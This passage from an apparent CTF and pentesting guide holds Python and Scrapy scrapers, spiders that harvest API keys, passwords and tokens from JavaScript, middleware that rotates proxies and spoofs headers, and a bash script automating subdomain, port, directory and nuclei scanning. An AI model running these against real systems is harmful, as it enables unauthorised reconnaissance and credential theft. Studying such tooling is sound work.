            if next_link and next_link.get('href'):
                current_url = urljoin(self.base_url, next_link['href'])
                page_num += 1
                time.sleep(1)
            else:
                print(f"[*] No more pages. Scraped {page_num} pages total.")
                current_url = None
        
        return all_data
    
    def scrape_infinite_scroll(self, api_endpoint, limit=100):
        """
        Handle infinite scroll (AJAX pagination)
        """
        all_data = []
        offset = 0
        page_size = 20
        
        while len(all_data) < limit:
            print(f"[*] Fetching items {offset} to {offset + page_size}")
            
            response = self.session.get(api_endpoint, params={
                'offset': offset,
                'limit': page_size
            })
            
            if response.status_code != 200:
                break
            
            try:
                data = response.json()
                items = data.get('items', [])
                
                if not items:
                    print("[*] No more items available")
                    break
                
                all_data.extend(items)
                offset += page_size
                
                time.sleep(0.5)
            
            except Exception as e:
                print(f"[-] Error parsing response: {e}")
                break
        
        return all_data
    
    def extract_data_from_page(self, soup):
        """
        Extract data from page (customize based on target)
        """
        items = []
        
        # Example: extract product cards
        cards = soup.select('div.item-card')
        
        for card in cards:
            item = {
                'title': card.select_one('h3.title').get_text(strip=True) if card.select_one('h3.title') else None,
                'description': card.select_one('p.description').get_text(strip=True) if card.select_one('p.description') else None,
                'link': card.select_one('a').get('href') if card.select_one('a') else None
            }
            
            if item['title']:  # Only add if we got some data
                items.append(item)
        
        return items
    
    def detect_pagination_type(self, url):
        """
        Automatically detect pagination type
        """
        response = self.session.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Check for common pagination patterns
        pagination_indicators = {
            'next_link': soup.select_one('a.next, a[rel="next"]'),
            'numbered_links': soup.select('a.page-number, li.page-item a'),
            'load_more_button': soup.select_one('button.load-more, a.load-more')
        }
        
        print("[*] Detected pagination type:")
        for ptype, indicator in pagination_indicators.items():
            if indicator:
                print(f"    - {ptype}: Found")
        
        return pagination_indicators

# Usage examples
scraper = PaginationScraper('http://target.com')

# Example 1: Numbered pagination
data1 = scraper.scrape_all_pages_numbered('http://target.com/items', max_pages=10)
print(f"[+] Scraped {len(data1)} items using numbered pagination")

# Example 2: Next link pagination
data2 = scraper.scrape_all_pages_next_link('http://target.com/posts', next_selector='a.next-page')
print(f"[+] Scraped {len(data2)} items using next link pagination")

# Example 3: Infinite scroll (API)
data3 = scraper.scrape_infinite_scroll('http://target.com/api/items', limit=200)
print(f"[+] Scraped {len(data3)} items using infinite scroll")
````

### Error Handling & Logging

**Robust Scraping with Error Handling:**

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import logging
import time
from datetime import datetime
import traceback

class RobustScraper:
    def __init__(self, base_url, log_file='scraper.log'):
        self.base_url = base_url
        self.session = requests.Session()
        
        # Setup logging
        self.setup_logging(log_file)
        
        # Statistics
        self.stats = {
            'requests': 0,
            'successful': 0,
            'failed': 0,
            'retries': 0,
            'start_time': datetime.now()
        }
    
    def setup_logging(self, log_file):
        """Configure logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def fetch_with_retry(self, url, max_retries=3, backoff=2):
        """
        Fetch URL with exponential backoff retry
        """
        self.stats['requests'] += 1
        
        for attempt in range(max_retries):
            try:
                self.logger.info(f"Fetching: {url} (attempt {attempt + 1}/{max_retries})")
                
                response = self.session.get(url, timeout=10)
                response.raise_for_status()
                
                self.stats['successful'] += 1
                return response
            
            except requests.exceptions.Timeout:
                self.logger.warning(f"Timeout on attempt {attempt + 1}")
                self.stats['retries'] += 1
                if attempt < max_retries - 1:
                    wait_time = backoff ** attempt
                    self.logger.info(f"Waiting {wait_time}s before retry...")
                    time.sleep(wait_time)
            
            except requests.exceptions.HTTPError as e:
                self.logger.error(f"HTTP Error: {e}")
                
                # Handle specific status codes
                if response.status_code == 429:
                    # Rate limited
                    retry_after = int(response.headers.get('Retry-After', 60))
                    self.logger.warning(f"Rate limited. Waiting {retry_after}s...")
                    time.sleep(retry_after)
                    self.stats['retries'] += 1
                elif response.status_code in [500, 502, 503, 504]:
                    # Server error - retry
                    if attempt < max_retries - 1:
                        wait_time = backoff ** attempt
                        time.sleep(wait_time)
                        self.stats['retries'] += 1
                else:
                    # Client error - don't retry
                    self.stats['failed'] += 1
                    break
            
            except requests.exceptions.ConnectionError:
                self.logger.error(f"Connection error on attempt {attempt + 1}")
                if attempt < max_retries - 1:
                    wait_time = backoff ** attempt
                    time.sleep(wait_time)
                    self.stats['retries'] += 1
            
            except Exception as e:
                self.logger.error(f"Unexpected error: {e}")
                self.logger.debug(traceback.format_exc())
                self.stats['failed'] += 1
                break
        
        self.stats['failed'] += 1
        return None
    
    def safe_parse(self, response):
        """
        Safely parse HTML response
        """
        try:
            soup = BeautifulSoup(response.content, 'html.parser')
            return soup
        except Exception as e:
            self.logger.error(f"Failed to parse HTML: {e}")
            return None
    
    def safe_extract(self, soup, selector, attribute=None, default=None):
        """
        Safely extract data from soup
        """
        try:
            element = soup.select_one(selector)
            
            if not element:
                return default
            
            if attribute:
                return element.get(attribute, default)
            else:
                return element.get_text(strip=True)
        
        except Exception as e:
            self.logger.error(f"Failed to extract {selector}: {e}")
            return default
    
    def scrape_with_error_handling(self, urls):
        """
        Scrape multiple URLs with comprehensive error handling
        """
        results = []
        
        for i, url in enumerate(urls):
            self.logger.info(f"Processing URL {i+1}/{len(urls)}")
            
            try:
                # Fetch page
                response = self.fetch_with_retry(url)
                
                if not response:
                    self.logger.warning(f"Skipping {url} - fetch failed")
                    continue
                
                # Parse HTML
                soup = self.safe_parse(response)
                
                if not soup:
                    self.logger.warning(f"Skipping {url} - parse failed")
                    continue
                
                # Extract data
                data = {
                    'url': url,
                    'title': self.safe_extract(soup, 'title'),
                    'content': self.safe_extract(soup, 'div.content'),
                    'timestamp': datetime.now().isoformat()
                }
                
                results.append(data)
                self.logger.info(f"Successfully scraped: {url}")
            
            except KeyboardInterrupt:
                self.logger.warning("Scraping interrupted by user")
                break
            
            except Exception as e:
                self.logger.error(f"Unexpected error processing {url}: {e}")
                self.logger.debug(traceback.format_exc())
                continue
            
            # Polite delay
            time.sleep(1)
        
        self.print_statistics()
        return results
    
    def print_statistics(self):
        """Print scraping statistics"""
        elapsed = (datetime.now() - self.stats['start_time']).total_seconds()
        
        self.logger.info("=" * 60)
        self.logger.info("SCRAPING STATISTICS")
        self.logger.info("=" * 60)
        self.logger.info(f"Total requests: {self.stats['requests']}")
        self.logger.info(f"Successful: {self.stats['successful']}")
        self.logger.info(f"Failed: {self.stats['failed']}")
        self.logger.info(f"Retries: {self.stats['retries']}")
        self.logger.info(f"Success rate: {self.stats['successful']/self.stats['requests']*100:.2f}%")
        self.logger.info(f"Total time: {elapsed:.2f}s")
        self.logger.info(f"Requests per second: {self.stats['requests']/elapsed:.2f}")
        self.logger.info("=" * 60)

# Usage
scraper = RobustScraper('http://target.com')

urls = [f'http://target.com/page/{i}' for i in range(1, 51)]
results = scraper.scrape_with_error_handling(urls)

print(f"\n[+] Scraped {len(results)} pages successfully")
```

### Complete Integration Example

**Combining Requests, BeautifulSoup, and Selenium:**

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

class HybridScraper:
    """
    Use requests for static content, Selenium for dynamic content
    """
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.driver = None
    
    def init_selenium(self):
        """Initialize Selenium when needed"""
        if not self.driver:
            options = Options()
            options.add_argument('--headless')
            options.add_argument('--no-sandbox')
            self.driver = webdriver.Chrome(options=options)
    
    def close_selenium(self):
        """Close Selenium driver"""
        if self.driver:
            self.driver.quit()
            self.driver = None
    
    def scrape_static_page(self, path):
        """Use requests for static content"""
        url = f"{self.base_url}{path}"
        response = self.session.get(url)
        return BeautifulSoup(response.content, 'html.parser')
    
    def scrape_dynamic_page(self, path):
        """Use Selenium for JavaScript-heavy pages"""
        self.init_selenium()
        url = f"{self.base_url}{path}"
        
        self.driver.get(url)
        
        # Wait for dynamic content to load
        WebDriverWait(self.driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, 'div.loaded'))
        )
        
        # Get rendered HTML
        html = self.driver.page_source
        return BeautifulSoup(html, 'html.parser')
    
    def solve_ctf_challenge(self):
        """
        Example: Solve CTF requiring both static and dynamic scraping
        """
        print("[*] Phase 1: Scraping static landing page")
        landing = self.scrape_static_page('/')
        
        # Extract initial clue
        clue = landing.select_one('div.clue').get_text(strip=True)
        print(f"[+] Found clue: {clue}")
        
        print("\n[*] Phase 2: Navigating dynamic portal")
        portal = self.scrape_dynamic_page('/portal')
        
        # Find hidden link revealed by JavaScript
        hidden_link = portal.select_one('a.hidden-by-js')
        if hidden_link:
            next_path = hidden_link.get('href')
            print(f"[+] Found hidden path: {next_path}")
            
            print("\n[*] Phase 3: Following hidden path")
            final_page = self.scrape_static_page(next_path)
            
            # Extract flag
            flag = final_page.select_one('div.flag').get_text(strip=True)
            print(f"[+] FLAG: {flag}")
            
            return flag
        
        return None
    
    def __del__(self):
        """Cleanup"""
        self.close_selenium()

# Usage
scraper = HybridScraper('http://ctf.challenge.com')
flag = scraper.solve_ctf_challenge()
```

This comprehensive guide provides practical techniques for web scraping and automation in CTF contexts, covering both static and dynamic content extraction with proper error handling, anti-detection measures, and efficient data processing.

---

## Scrapy for Large-Scale Scraping

Scrapy is a Python framework for extracting data from websites efficiently, handling concurrent requests, managing robots.txt, and processing large datasets.

### Installation & Setup

```bash
# Install Scrapy
pip3 install scrapy

# Verify installation
scrapy version

# Create new Scrapy project
scrapy startproject ctf_recon
cd ctf_recon

# Project structure:
# ctf_recon/
# ├── scrapy.cfg              # Configuration
# └── ctf_recon/
#     ├── __init__.py
#     ├── items.py            # Data models
#     ├── middlewares.py      # Custom middleware
#     ├── pipelines.py        # Data processing
#     ├── settings.py         # Project settings
#     └── spiders/            # Spider definitions
```

### Basic Spider Creation

**Simple endpoint enumeration spider:**

```python
# spiders/endpoint_spider.py
import scrapy
import re
from urllib.parse import urljoin, urlparse

class EndpointSpider(scrapy.Spider):
    name = "endpoints"
    
    # Target configuration
    allowed_domains = ['target.com']
    start_urls = ['https://target.com']
    
    # Store discovered endpoints
    endpoints = set()
    
    custom_settings = {
        'DEPTH_LIMIT': 5,
        'CONCURRENT_REQUESTS': 16,
        'DOWNLOAD_DELAY': 0.5,
        'ROBOTSTXT_OBEY': False,  # CTF: Often ignore robots.txt
        'USER_AGENT': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
    }
    
    def parse(self, response):
        # Extract all links
        links = response.css('a::attr(href)').getall()
        
        # Extract API endpoints from JavaScript
        js_content = response.css('script::text').getall()
        for script in js_content:
            # Find API patterns
            api_patterns = [
                r'/api/[a-zA-Z0-9/_-]+',
                r'/v\d+/[a-zA-Z0-9/_-]+',
                r'https?://[^"\']+/api/[^"\']+',
            ]
            
            for pattern in api_patterns:
                matches = re.findall(pattern, script)
                for match in matches:
                    full_url = urljoin(response.url, match)
                    if full_url not in self.endpoints:
                        self.endpoints.add(full_url)
                        yield {
                            'url': full_url,
                            'found_in': response.url,
                            'type': 'api_endpoint'
                        }
        
        # Extract form actions
        forms = response.css('form')
        for form in forms:
            action = form.css('::attr(action)').get()
            method = form.css('::attr(method)').get() or 'GET'
            
            if action:
                full_url = urljoin(response.url, action)
                yield {
                    'url': full_url,
                    'method': method,
                    'found_in': response.url,
                    'type': 'form_action'
                }
        
        # Follow links
        for link in links:
            if link:
                yield response.follow(link, callback=self.parse)
    
    def closed(self, reason):
        # Save results when spider closes
        self.logger.info(f"Discovered {len(self.endpoints)} unique endpoints")
```

**Running the spider:**

```bash
# Basic execution
scrapy crawl endpoints

# Output to JSON
scrapy crawl endpoints -o endpoints.json

# Output to CSV
scrapy crawl endpoints -o endpoints.csv

# With custom settings
scrapy crawl endpoints -s DEPTH_LIMIT=10 -s CONCURRENT_REQUESTS=32

# Verbose logging
scrapy crawl endpoints -L DEBUG
```

### Advanced Spider - JavaScript Extraction

**Spider extracting JavaScript files and analyzing them:**

```python
# spiders/js_analyzer.py
import scrapy
import re
import json
from urllib.parse import urljoin, urlparse

class JSAnalyzerSpider(scrapy.Spider):
    name = "js_analyzer"
    
    custom_settings = {
        'CONCURRENT_REQUESTS': 8,
        'DOWNLOAD_DELAY': 0.3,
        'ROBOTSTXT_OBEY': False,
    }
    
    def __init__(self, target=None, *args, **kwargs):
        super().__init__(*args, **kwargs)
        if target:
            self.start_urls = [target]
            self.allowed_domains = [urlparse(target).netloc]
    
    def parse(self, response):
        # Extract all JavaScript file references
        js_files = []
        
        # From script tags
        js_files.extend(response.css('script::attr(src)').getall())
        
        # From inline references
        js_refs = re.findall(r'["\']([^"\']+\.js[^"\']*)["\']', response.text)
        js_files.extend(js_refs)
        
        # Process each JS file
        for js_url in js_files:
            full_url = urljoin(response.url, js_url)
            yield scrapy.Request(
                full_url, 
                callback=self.parse_javascript,
                meta={'referer': response.url}
            )
        
        # Follow page links
        for link in response.css('a::attr(href)').getall():
            if link:
                yield response.follow(link, callback=self.parse)
    
    def parse_javascript(self, response):
        js_content = response.text
        findings = {
            'url': response.url,
            'referer': response.meta.get('referer'),
            'size': len(js_content),
            'findings': {}
        }
        
        # Extract API endpoints
        api_endpoints = re.findall(
            r'["\']([/a-zA-Z0-9_-]*?/api/[a-zA-Z0-9/_-]+)["\']',
            js_content
        )
        findings['findings']['api_endpoints'] = list(set(api_endpoints))
        
        # Extract API keys (various formats)
        api_key_patterns = {
            'generic': r'["\']?api[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            'aws': r'AKIA[0-9A-Z]{16}',
            'google': r'AIza[0-9A-Za-z-_]{35}',
            'slack': r'xox[baprs]-[0-9a-zA-Z]{10,48}',
            'github': r'gh[pousr]_[0-9a-zA-Z]{36}',
            'jwt': r'eyJ[A-Za-z0-9-_=]+\.eyJ[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*',
        }
        
        for key_type, pattern in api_key_patterns.items():
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            if matches:
                findings['findings'][f'{key_type}_keys'] = matches
        
        # Extract URLs and domains
        urls = re.findall(
            r'https?://[a-zA-Z0-9.-]+(?:/[^\s"\'<>]*)?',
            js_content
        )
        findings['findings']['external_urls'] = list(set(urls))
        
        # Extract potential secrets/passwords
        secret_patterns = [
            r'password["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'secret["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        ]
        
        secrets = []
        for pattern in secret_patterns:
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            secrets.extend(matches)
        
        if secrets:
            findings['findings']['potential_secrets'] = list(set(secrets))
        
        # Extract comments (may contain sensitive info)
        single_line = re.findall(r'//\s*(.+)$', js_content, re.MULTILINE)
        multi_line = re.findall(r'/\*\s*(.+?)\s*\*/', js_content, re.DOTALL)
        
        comments = single_line + multi_line
        # Filter interesting comments
        interesting = [c for c in comments if any(
            keyword in c.lower() 
            for keyword in ['todo', 'fixme', 'bug', 'hack', 'test', 'debug', 'password', 'secret']
        )]
        
        if interesting:
            findings['findings']['interesting_comments'] = interesting[:10]
        
        # Extract function names (potential endpoints)
        functions = re.findall(r'function\s+([a-zA-Z_$][a-zA-Z0-9_$]*)\s*\(', js_content)
        findings['findings']['functions'] = list(set(functions))[:20]
        
        # Extract webpack/module info
        if 'webpackJsonp' in js_content or 'webpack_require' in js_content:
            findings['findings']['framework'] = 'webpack'
        
        yield findings
```

**Execution with results filtering:**

```bash
# Run spider
scrapy crawl js_analyzer -a target=https://target.com -o js_results.json

# Parse results for sensitive data
cat js_results.json | jq '.[] | select(.findings.potential_secrets) | {url, secrets: .findings.potential_secrets}'

# Extract all API endpoints
cat js_results.json | jq -r '.[] | .findings.api_endpoints[]?' | sort -u > api_endpoints.txt

# Find API keys
cat js_results.json | jq '.[] | select(.findings | has("aws_keys") or has("google_keys"))'
```

### Form Discovery & Parameter Extraction

**Spider for comprehensive form analysis:**

```python
# spiders/form_spider.py
import scrapy
from urllib.parse import urljoin

class FormSpider(scrapy.Spider):
    name = "forms"
    
    custom_settings = {
        'DEPTH_LIMIT': 3,
        'CONCURRENT_REQUESTS': 16,
    }
    
    def __init__(self, target=None, *args, **kwargs):
        super().__init__(*args, **kwargs)
        if target:
            self.start_urls = [target]
    
    def parse(self, response):
        # Extract all forms
        forms = response.css('form')
        
        for form in forms:
            form_data = {
                'found_on': response.url,
                'action': form.css('::attr(action)').get(),
                'method': (form.css('::attr(method)').get() or 'GET').upper(),
                'enctype': form.css('::attr(enctype)').get(),
                'inputs': [],
                'csrf_token': None,
                'potential_vulnerabilities': []
            }
            
            # Make action URL absolute
            if form_data['action']:
                form_data['action'] = urljoin(response.url, form_data['action'])
            else:
                form_data['action'] = response.url
            
            # Extract all input fields
            inputs = form.css('input, textarea, select')
            
            for input_field in inputs:
                input_info = {
                    'name': input_field.css('::attr(name)').get(),
                    'type': input_field.css('::attr(type)').get() or 'text',
                    'value': input_field.css('::attr(value)').get(),
                    'required': input_field.css('::attr(required)').get() is not None,
                }
                
                form_data['inputs'].append(input_info)
                
                # Check for CSRF token
                if input_info['name'] and 'csrf' in input_info['name'].lower():
                    form_data['csrf_token'] = input_info['name']
                
                # Check for hidden admin fields
                if input_info['type'] == 'hidden':
                    if any(keyword in (input_info['name'] or '').lower() 
                           for keyword in ['admin', 'role', 'privilege', 'is_admin']):
                        form_data['potential_vulnerabilities'].append('hidden_privilege_field')
            
            # Check for potential vulnerabilities
            
            # No CSRF token on state-changing requests
            if form_data['method'] == 'POST' and not form_data['csrf_token']:
                form_data['potential_vulnerabilities'].append('missing_csrf_token')
            
            # File upload without restriction indicators
            if any(inp['type'] == 'file' for inp in form_data['inputs']):
                form_data['potential_vulnerabilities'].append('file_upload')
            
            # Password field without autocomplete=off
            password_fields = form.css('input[type="password"]')
            for pf in password_fields:
                if pf.css('::attr(autocomplete)').get() != 'off':
                    form_data['potential_vulnerabilities'].append('password_autocomplete_enabled')
            
            yield form_data
        
        # Follow links
        for link in response.css('a::attr(href)').getall():
            yield response.follow(link, callback=self.parse)
```

**Analyzing form results:**

```bash
# Run spider
scrapy crawl forms -a target=https://target.com -o forms.json

# Find forms without CSRF protection
cat forms.json | jq '.[] | select(.method == "POST" and .csrf_token == null)'

# Find file upload forms
cat forms.json | jq '.[] | select(.inputs[] | .type == "file")'

# Find forms with hidden privilege fields
cat forms.json | jq '.[] | select(.potential_vulnerabilities[] | contains("hidden_privilege"))'

# Generate curl commands for testing
cat forms.json | jq -r '.[] | "curl -X \(.method) \"\(.action)\" " + (.inputs | map("-d \"\(.name)=test\"") | join(" "))'
```

### Scrapy with Authentication

**Spider handling login and authenticated scraping:**

```python
# spiders/auth_spider.py
import scrapy
from scrapy.http import FormRequest

class AuthSpider(scrapy.Spider):
    name = "authenticated"
    
    def __init__(self, username=None, password=None, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.username = username
        self.password = password
        self.start_urls = ['https://target.com/login']
    
    def parse(self, response):
        # Extract CSRF token if present
        csrf_token = response.css('input[name*="csrf"]::attr(value)').get()
        
        # Prepare login form data
        formdata = {
            'username': self.username,
            'password': self.password,
        }
        
        if csrf_token:
            # Find CSRF token field name
            csrf_field = response.css('input[name*="csrf"]::attr(name)').get()
            formdata[csrf_field] = csrf_token
        
        # Submit login form
        return FormRequest.from_response(
            response,
            formdata=formdata,
            callback=self.after_login
        )
    
    def after_login(self, response):
        # Check if login successful
        if 'logout' in response.text.lower() or 'dashboard' in response.url:
            self.logger.info('Login successful!')
            
            # Start authenticated crawling
            yield scrapy.Request(
                'https://target.com/dashboard',
                callback=self.parse_authenticated
            )
            yield scrapy.Request(
                'https://target.com/api/user/profile',
                callback=self.parse_api
            )
        else:
            self.logger.error('Login failed!')
    
    def parse_authenticated(self, response):
        # Extract authenticated-only content
        yield {
            'url': response.url,
            'title': response.css('title::text').get(),
            'content_length': len(response.text),
        }
        
        # Look for admin links
        admin_links = response.css('a[href*="admin"]::attr(href)').getall()
        for link in admin_links:
            yield response.follow(link, callback=self.parse_authenticated)
    
    def parse_api(self, response):
        # Extract API responses
        try:
            data = response.json()
            yield {
                'endpoint': response.url,
                'data': data,
                'type': 'api_response'
            }
        except:
            pass
```

**Usage with credentials:**

```bash
# Run with authentication
scrapy crawl authenticated -a username=testuser -a password=testpass -o auth_results.json

# With cookie-based auth (session provided)
scrapy crawl authenticated -s COOKIES_ENABLED=True -s COOKIES_DEBUG=True
```

### Scrapy Pipelines for Data Processing

**Custom pipeline for vulnerability detection:**

```python
# pipelines.py
import re

class VulnerabilityDetectionPipeline:
    
    def __init__(self):
        self.vulnerabilities = []
    
    def process_item(self, item, spider):
        # Skip if not relevant type
        if item.get('type') not in ['api_endpoint', 'form_action', 'api_response']:
            return item
        
        # Check for SQL injection indicators in URLs
        if 'url' in item:
            url = item['url']
            
            # SQL injection patterns
            if re.search(r'[?&](id|user|page|category)=\d+', url):
                self.vulnerabilities.append({
                    'type': 'potential_sqli',
                    'url': url,
                    'parameter': re.search(r'[?&](id|user|page|category)=', url).group(1),
                    'reason': 'Numeric parameter susceptible to SQLi'
                })
            
            # XSS indicators
            if re.search(r'[?&](search|query|q|name)=', url):
                self.vulnerabilities.append({
                    'type': 'potential_xss',
                    'url': url,
                    'parameter': re.search(r'[?&](search|query|q|name)=', url).group(1),
                    'reason': 'User input reflected in response'
                })
            
            # Path traversal
            if '../' in url or '..%2f' in url.lower():
                self.vulnerabilities.append({
                    'type': 'path_traversal',
                    'url': url,
                    'reason': 'Path traversal sequence detected'
                })
        
        # Check for sensitive data exposure in API responses
        if item.get('type') == 'api_response' and 'data' in item:
            data_str = str(item['data']).lower()
            
            sensitive_keywords = ['password', 'secret', 'token', 'api_key', 'private_key', 'ssn']
            for keyword in sensitive_keywords:
                if keyword in data_str:
                    self.vulnerabilities.append({
                        'type': 'sensitive_data_exposure',
                        'url': item.get('endpoint'),
                        'keyword': keyword,
                        'reason': f'API response contains "{keyword}"'
                    })
        
        return item
    
    def close_spider(self, spider):
        # Output vulnerabilities at spider close
        spider.logger.info(f"Detected {len(self.vulnerabilities)} potential vulnerabilities")
        
        # Save to file
        import json
        with open('vulnerabilities_detected.json', 'w') as f:
            json.dump(self.vulnerabilities, f, indent=2)
```

**Enable pipeline in settings.py:**

```python
# settings.py
ITEM_PIPELINES = {
    'ctf_recon.pipelines.VulnerabilityDetectionPipeline': 300,
}
```

### Scrapy Middleware for Custom Headers & Proxies

**Custom middleware for rotating user agents and proxies:**

```python
# middlewares.py
import random
from scrapy import signals

class RandomUserAgentMiddleware:
    
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        ]
    
    def process_request(self, request, spider):
        request.headers['User-Agent'] = random.choice(self.user_agents)


class ProxyMiddleware:
    
    def __init__(self):
        # Load proxies from file or list
        self.proxies = [
            'http://proxy1.com:8080',
            'http://proxy2.com:8080',
            'http://proxy3.com:8080',
        ]
    
    def process_request(self, request, spider):
        if self.proxies:
            request.meta['proxy'] = random.choice(self.proxies)


class CustomHeadersMiddleware:
    
    def process_request(self, request, spider):
        # Add custom headers for pentesting
        request.headers['X-Forwarded-For'] = '127.0.0.1'
        request.headers['X-Original-URL'] = request.url
        request.headers['X-Rewrite-URL'] = request.url
```

**Enable in settings.py:**

```python
# settings.py
DOWNLOADER_MIDDLEWARES = {
    'ctf_recon.middlewares.RandomUserAgentMiddleware': 400,
    'ctf_recon.middlewares.ProxyMiddleware': 410,
    'ctf_recon.middlewares.CustomHeadersMiddleware': 420,
}
```

## Automated Reconnaissance

Automated reconnaissance combines multiple tools and techniques to systematically enumerate targets, discover assets, and identify potential vulnerabilities.

### Comprehensive Recon Framework

**Multi-stage reconnaissance script:**

```bash
#!/bin/bash
# comprehensive_recon.sh

TARGET=$1
OUTPUT_DIR="recon_${TARGET}_$(date +%Y%m%d_%H%M%S)"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target.com>"
    exit 1
fi

# Create output directory
mkdir -p "$OUTPUT_DIR"
cd "$OUTPUT_DIR"

echo "[*] Starting comprehensive reconnaissance on $TARGET"
echo "[*] Output directory: $OUTPUT_DIR"

# =====================================
# Stage 1: Subdomain Enumeration
# =====================================
echo -e "\n[+] Stage 1: Subdomain Enumeration"

# subfinder
echo "  [*] Running subfinder..."
subfinder -d "$TARGET" -silent -o subdomains_subfinder.txt 2>/dev/null

# amass
echo "  [*] Running amass..."
amass enum -passive -d "$TARGET" -o subdomains_amass.txt 2>/dev/null

# assetfinder
echo "  [*] Running assetfinder..."
assetfinder --subs-only "$TARGET" > subdomains_assetfinder.txt 2>/dev/null

# crt.sh
echo "  [*] Querying crt.sh..."
curl -s "https://crt.sh/?q=%.$TARGET&output=json" | \
    jq -r '.[].name_value' | \
    sed 's/\*\.//g' | \
    sort -u > subdomains_crtsh.txt 2>/dev/null

# Combine and deduplicate
cat subdomains_*.txt | sort -u > subdomains_all.txt
SUBDOMAIN_COUNT=$(wc -l < subdomains_all.txt)
echo "  [✓] Found $SUBDOMAIN_COUNT unique subdomains"

# =====================================
# Stage 2: Active Subdomain Probing
# =====================================
echo -e "\n[+] Stage 2: Probing Live Hosts"

# httpx - check which subdomains are alive
echo "  [*] Running httpx..."
cat subdomains_all.txt | \
    httpx -silent -status-code -title -tech-detect -follow-redirects \
    -o httpx_results.txt 2>/dev/null

# Extract live hosts
cat httpx_results.txt | awk '{print $1}' > live_hosts.txt
LIVE_COUNT=$(wc -l < live_hosts.txt)
echo "  [✓] Found $LIVE_COUNT live hosts"

# =====================================
# Stage 3: Port Scanning
# =====================================
echo -e "\n[+] Stage 3: Port Scanning"

echo "  [*] Running nmap on live hosts..."
nmap -iL live_hosts.txt -T4 -p- --open -oA nmap_full 2>/dev/null &
NMAP_PID=$!

# Quick scan while full scan runs
nmap -iL live_hosts.txt -T4 -F --open -oA nmap_quick 2>/dev/null
echo "  [✓] Quick scan complete (full scan running in background)"

# =====================================
# Stage 4: Web Technology Detection
# =====================================
echo -e "\n[+] Stage 4: Technology Detection"

echo "  [*] Running whatweb..."
cat live_hosts.txt | while read host; do
    whatweb "$host" --color=never --log-brief=whatweb_results.txt 2>/dev/null
done
echo "  [✓] Technology detection complete"

# =====================================
# Stage 5: Directory/File Discovery
# =====================================
echo -e "\n[+] Stage 5: Content Discovery"

# Create directory for individual scans
mkdir -p directory_scans

echo "  [*] Running ffuf on live hosts..."
cat live_hosts.txt | while read host; do
    hostname=$(echo "$host" | sed 's/https\?:\/\///g' | tr '/:' '_')
    
    # Directory brute force
    ffuf -u "$host/FUZZ" \
        -w /usr/share/wordlists/dirb/common.txt \
        -mc 200,201,202,203,204,301,302,307,308,401,403 \
        -o "directory_scans/${hostname}_dirs.json" \
        -s 2>/dev/null
    
    # API endpoint discovery
    ffuf -u "$host/api/FUZZ" \
        -w /usr/share/wordlists/api/api-endpoints.txt \
        -mc 200,201,202,204,400,401,403,405,500 \
        -o "directory_scans/${hostname}_api.json" \
        -s 2>/dev/null
done

echo "  [✓] Directory enumeration complete"

# =====================================
# Stage 6: JavaScript Analysis
# =====================================
echo -e "\n[+] Stage 6: JavaScript Analysis"

echo "  [*] Extracting and analyzing JavaScript..."
mkdir -p js_files

cat live_hosts.txt | while read host; do
    hostname=$(echo "$host" | sed 's/https\?:\/\///g' | tr '/:' '_')
    
    # Get all JS files
    echo "$host" | hakrawler -plain -js | grep "\.js$" | \
        sort -u > "js_files/${hostname}_js_urls.txt"
    
    # Download and analyze
    cat "js_files/${hostname}_js_urls.txt" | while read js_url; do
        curl -s "$js_url" > "js_files/${hostname}_$(basename $js_url)"
    done
done

# Extract secrets from JS files
echo "  [*] Searching for secrets in JavaScript..."
grep -rEi "api[_-]?key|secret|password|token" js_files/ > js_secrets.txt 2>/dev/null

# Extract endpoints
grep -rEoh "(https?://|/)[a-zA-Z0-9./?=_-]*" js_files/ | \
    grep -E "^(https?://|/api/|/v[0-9]+/)" | \
    sort -u > js_endpoints.txt

echo "  [✓] JavaScript analysis complete"

# =====================================
# Stage 7: Parameter Discovery
# =====================================
echo -e "\n[+] Stage 7: Parameter Discovery"

echo "  [*] Discovering parameters..."
cat live_hosts.txt | while read host; do
    # Arjun for parameter discovery
    arjun -u "$host" -oT "parameters_$(echo $host | tr '/:' '_').txt" 2>/dev/null
done

echo "  [✓] Parameter discovery complete"

# =====================================
# Stage 8: Vulnerability Scanning
# =====================================
echo -e "\n[+] Stage 8: Vulnerability Scanning"

echo "  [*] Running Nuclei..."
cat live_hosts.txt | \
    nuclei -silent -severity critical,high,medium \
    -o nuclei_vulnerabilities.txt 2>/dev/null

echo "  [✓] Vulnerability scan complete"

# =====================================
# Stage 9: Generate Report
# =====================================
echo -e "\n[+] Generating Report"

cat > REPORT.txt << EOF
===========================================
